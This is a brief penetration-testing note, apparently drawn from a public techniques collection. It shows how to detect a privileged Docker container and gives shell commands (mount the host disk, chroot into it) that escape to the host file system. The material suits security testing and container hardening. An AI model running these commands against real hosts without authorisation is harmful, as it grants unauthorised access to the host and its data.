Techniques: https://swisskyrepo.github.io/InternalAllTheThings/containers/docker/

## Mount the Host File System

Identify: Run fdisk -l or ls /dev. If you see the host's raw block devices (like /dev/sda1 or /dev/nvme0n1), the container is likely privileged.

Exploit: You can mount the host's entire hard drive directly into the container.
bash
```
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host /bin/bash
```
